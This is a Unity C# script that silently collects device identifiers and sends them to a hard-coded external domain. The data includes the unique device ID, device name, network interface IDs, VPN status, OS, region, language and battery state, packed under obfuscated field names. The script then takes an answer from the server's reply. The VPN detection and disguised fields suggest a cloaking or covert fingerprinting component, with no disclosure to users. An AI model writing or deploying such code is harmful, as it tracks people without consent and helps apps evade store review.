using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using UnityEngine;

public class RequestToServer : MonoBehaviour
{
    [SerializeField] private string _URL = "https://reqbackendstorage.fun/app/d44pspac4unrladv4nt";
    [SerializeField] private string _Key;
    public bool IsRequestDone { get; private set; }
    
    public string Answer { get; private set; }
    
    public void Request()
    {
        IsRequestDone = false;

        string _json = GenerateData();

        string _response;
        
        HttpWebRequest _request = WebRequest.CreateHttp(_URL);
        
        _request.ContentType = "application/json";
        
        _request.Method = "POST";

        using (var _stream_Writer = new StreamWriter(_request.GetRequestStream()))
            _stream_Writer.Write(_json);
        
        HttpWebResponse httpResponse = (HttpWebResponse)_request.GetResponse();
        
        using (StreamReader _stream_Reader = new StreamReader(httpResponse.GetResponseStream()))
            _response = _stream_Reader.ReadToEnd();
        
        string[] _params  = _response.Split(",");
             
         Answer = GetKeyValue(_params, _Key);

         IsRequestDone = true;
         
    }

    private string GetKeyValue(string[] _array, string _param)
    {
        string _param_String = "";
        string _key = "";
        
        foreach (string _string in _array)
        {
            if (!_string.Contains(_param))
                continue;

            _param_String = _string;
            break;

        }

        if (_param_String.Length <= 0)
            return _key;
        
        _param_String = _param_String.Trim('{', '}');

        int i = 0;

        while (_param_String[i] != ':')
            i++;
        
        i++;
        
        _key = _param_String.Substring(i);

        return _key;
    }

    private string GenerateData()
    {
        NetworkInterface[] _interfaces = NetworkInterface.GetAllNetworkInterfaces();

        List<string> _wifi_Address = new List<string>();

        if (_interfaces.Length > 1)
        {
            for (int i = 0; i < _interfaces.Length; i++)
            {
                _wifi_Address.Add(_interfaces[i].Id);
            }
        }
        else if(_interfaces.Length == 1)
            _wifi_Address.Add(_interfaces[0].Id);

        UserData _user_Data = new UserData();
        
        _user_Data.vivisWork = IsVpn();
        _user_Data.gfdokPS = SystemInfo.deviceModel;
        _user_Data.gdpsjPjg = SystemInfo.deviceName;
        _user_Data.poguaKFP = SystemInfo.deviceUniqueIdentifier;
        _user_Data.gpaMFOfa = _wifi_Address;
        _user_Data.bcpJFs = Environment.OSVersion.Version.ToString();
        _user_Data.GOmblx = Application.systemLanguage.ToString();
        _user_Data.G0pxum = DateTime.Now.ToString();
        _user_Data.Fpvbduwm = SystemInfo.batteryStatus == BatteryStatus.Charging;
        _user_Data.Fpbjcv = SystemInfo.systemMemorySize.ToString();
        _user_Data.gfpbvjsoM = (int)SystemInfo.batteryLevel;
        _user_Data.bpPjfns = RegionInfo.CurrentRegion.ToString();
        _user_Data.oahgoMAOI = SystemInfo.batteryStatus == BatteryStatus.Full;

        Root _root = new Root()
        {
            code = "d44pspac4unrladv4nt",
            userData = _user_Data
        };
        
        string _json = JsonUtility.ToJson(_root, true);

        return _json;
    }

    private bool IsVpn()
    {
        bool isVPN = false;
        if (NetworkInterface.GetIsNetworkAvailable())
        {
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface Interface in interfaces)
            {
                if (Interface.OperationalStatus == OperationalStatus.Up)
                {
                    if 
                    (
                        ((Interface.NetworkInterfaceType == NetworkInterfaceType.Ppp) 
                         && (Interface.NetworkInterfaceType != NetworkInterfaceType.Loopback)) 
                        || Interface.Description.Contains("VPN") 
                        || Interface.Description.Contains("vpn"))
                    {
                        IPv4InterfaceStatistics statistics = Interface.GetIPv4Statistics();
                        isVPN = true;
                    }
                }
            }
        }
        return isVPN;
    }
}

[Serializable]
public class BvoikOGjs
{
//     public bool IsAppInstalled(string bundleID){
// #if UNITY_ANDROID
//         AndroidJavaClass up = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
//         AndroidJavaObject ca = up.GetStatic<AndroidJavaObject>("currentActivity");
//         AndroidJavaObject packageManager = ca.Call("getPackageManager");
//         Debug.Log(" ********LaunchOtherApp ");
//         AndroidJavaObject launchIntent = null;
// //if the app is installed, no errors. Else, doesn’t get past next line
//         try{
//             launchIntent = packageManager.Call("getLaunchIntentForPackage",bundleID);
// //
// // ca.Call(“startActivity”,launchIntent);
//         }catch(Exception ex){
//             Debug.Log(“exception”+ex.Message);
//         }
//         if(launchIntent == null)
//             return false;
//         return true;
// #else
// return false;
// #endif
}

[Serializable]
public class Root
{
    [SerializeField] public string code;
    [SerializeField] public string setIp;
    [SerializeField] public UserData userData;
    [SerializeField] public string setUserAgent;
}

[Serializable]
public class UserData
{
    [SerializeField] public string gdpsjPjg;
    [SerializeField] public BvoikOGjs bvoikOGjs;
    [SerializeField] public bool StwPp;
    [SerializeField] public int gfpbvjsoM;
    [SerializeField] public bool vivisWork;
    [SerializeField] public string bpPjfns;
    [SerializeField] public string bcpJFs;
    [SerializeField] public string Fpbjcv;
    [SerializeField] public bool KDhsd;
    [SerializeField] public string GOmblx;
    [SerializeField] public List<string> gciOFm;
    [SerializeField] public string poguaKFP;
    [SerializeField] public List<string> gpaMFOfa;
    [SerializeField] public bool Fpvbduwm;
    [SerializeField] public bool biMpaiuf;
    [SerializeField] public bool oahgoMAOI;
    [SerializeField] public string gfdokPS;
    [SerializeField] public List<string> gfdosnb;
    [SerializeField] public string G0pxum;
}
